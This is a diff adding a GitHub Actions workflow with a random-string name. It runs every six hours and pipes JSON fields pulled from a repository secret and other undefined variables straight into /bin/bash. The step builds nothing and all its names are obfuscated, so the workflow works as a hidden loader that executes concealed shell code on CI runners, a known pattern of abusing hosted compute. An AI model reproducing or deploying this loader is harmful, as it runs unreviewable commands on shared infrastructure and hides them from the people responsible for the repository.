@@ -1,0 +1,23 @@
+name: carglucose
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '2 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: carglucose
+        env:
+          xdtrz5: ${{ secrets.xdtrz5 }}
+        run: |
+          echo $xdtrz5 | jq -r .w22837 | /bin/bash
+          echo $af25 | jq -r .d0929 | /bin/bash
+          echo $zvoy7 | jq -r .mj09 | /bin/bash
+          echo $enlyl614 | jq -r .fwiz59 | /bin/bash
+          echo $mc7 | jq -r .cfuk88892 | /bin/bash
+          echo $yajn3668 | jq -r .aw54 | /bin/bash
+          echo $syf2222 | jq -r .ptnkk963 | /bin/bash
+
